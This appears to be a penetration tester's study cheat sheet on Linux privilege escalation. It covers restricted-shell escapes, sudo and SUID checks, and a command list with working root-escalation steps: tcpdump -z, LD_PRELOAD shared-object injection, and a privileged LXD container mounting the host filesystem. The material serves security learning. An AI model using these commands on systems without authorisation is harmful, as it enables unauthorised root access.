# Linux Privilege Escalation - Techniques

[Environmental-based Privilege Escalation](#environmental-based-privilege-escalation)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Sudo Abuse](#sudo-abuse)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Path Abuse](#path-abuse)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Wildcard Abuse](#wildcard-abuse)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Restricted Shell Escape](#restricted-shell-escape)<br/>
[Permissions-based Privilege Escalation](#permissions-based-privilege-escalation)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[System Information](#system-information)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Network Information](#network-information)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[File Systems, Drives, & Peripherals](#file-systems-drives--peripherals)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Passwords & Hashes](#passwords--hashes)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Processes](#processes)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Services, Packages, & Binaries](#services-packages--binaries)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Writable Directories & Files](#writable-directories--files)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Interesting Directories](#interesting-directories)<br/>

## Environmental-based Privilege Escalation

### Sudo Abuse

[Sudo Abuse](sudo.md)

### Path Abuse

[Path Abuse](path-abuse.md)

### Wildcard Abuse

[Wildcard Abuse](wild-card-abuse.md)

### Restricted Shell Escape

https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/escaping-from-limited-bash

```text
Common Ristricted Shells
* rbash - most restrictive
* rksh - moderately restrictive
* rzsh - most flexible
```

#### Command Injection

```text
This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow us to execute the pwd command and see the current working directory, even though the shell does not allow us to execute the pwd command directly.
```

```bash
haunter@OPFOR[/attacker]$ ls -l `pwd` 
```

#### Command Substition

```text
For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.
```

#### Command Chaining

```text
We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.
```

#### Environmental Variables

```text
For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.
```

#### Shell Functions

```text
For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.
```

## Permissions-based Privilege Escalation

### Special Permissions

```text
Check GTFObins for any SUID OR SGID bins.
```

### Sudo Abuse

```bash
# Check user's sudo commands with:
sudo -l
```

```text
If any commands are listed, check the man pages for the command. Can the command execute files or other commands? Create a revshell file and run or launch a shell.
```

### Prilileged Groups

[Privileged Groups](privileged-groups.md)

### Special File Capabilities

[Special File Capabilities](special-file-capabilities.md)

### Cron Job Abuse

[Cron Job Abuse](cron-job-abuse.md)


```bash
gcc kernel_expoit.c -o kernel_expoit #	Compile an exploit written in C
screen -v	# Check the installed version of Screen
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	# Priv esc with tcpdump
ldd /bin/ls	# View the shared objects required by a binary
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart	# Escalate privileges using LD_PRELOAD
readelf -d payroll | grep PATH	# Check the RUNPATH of a binary
gcc src.c -fPIC -shared -o /development/libshared.so	# Compiled a shared libary
lxd init	# Start the LXD initialization process
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine	# Import a local image
lxc init alpine r00t -c security.privileged=true	 # Start a privileged LXD container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true	# Mount the host file system in a container
lxc start r00t	# Start the container
showmount -e 10.129.2.12	# Show the NFS export list
sudo mount -t nfs 10.129.2.12:/tmp /mnt	# Mount an NFS share locally
tmux -S /shareds new -s debugsess	# Created a shared tmux session socket
./lynis audit system	# Perform a system audit with Lynis
```

